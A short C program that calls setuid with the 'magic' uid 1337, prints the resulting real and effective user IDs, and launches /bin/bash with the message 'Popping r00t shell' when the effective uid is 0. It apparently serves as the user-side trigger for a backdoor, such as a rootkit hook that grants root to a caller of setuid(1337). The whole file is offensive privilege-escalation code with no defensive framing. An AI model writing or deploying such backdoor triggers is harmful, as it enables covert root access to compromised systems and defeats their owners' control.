#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

int main()
{
	/* Makes syscall to setuid with 1337 as uid */
	setuid(1337);
	uid_t ID;
	uid_t EID;
	ID = getuid();
	EID = geteuid();
	printf("[+] UID = %hu\n[+] EUID = %hu\n",ID,EID);
	
	if (EID == 0)
	{
		printf("[!!!] Popping r00t shell!!!\n");
		system("/bin/bash");
	}
	return 0;
}
